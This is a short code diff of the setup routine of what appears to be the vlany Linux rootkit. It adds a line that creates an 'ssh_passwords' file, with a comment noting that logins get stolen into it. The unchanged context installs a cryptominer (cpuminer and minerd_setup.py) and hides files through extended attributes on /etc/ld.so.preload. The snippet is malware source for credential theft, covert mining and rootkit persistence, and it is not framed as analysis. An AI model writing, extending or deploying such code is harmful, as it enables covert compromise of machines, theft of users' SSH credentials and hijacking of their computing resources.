@@ -240,6 +240,7 @@ setup_vlany ()
     cp misc/cpuminer-master.zip $INSTALL/cpuminer-master.zip
     mv minerd_setup.py $INSTALL/minerd_setup.py
     chmod +x $INSTALL/minerd_setup.py
+    touch $INSTALL/ssh_passwords # gets rid of annoying "no such file or dir" output when no logins have been stolen yet
 
     # protect files and directories
     setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} /etc/ld.so.preload
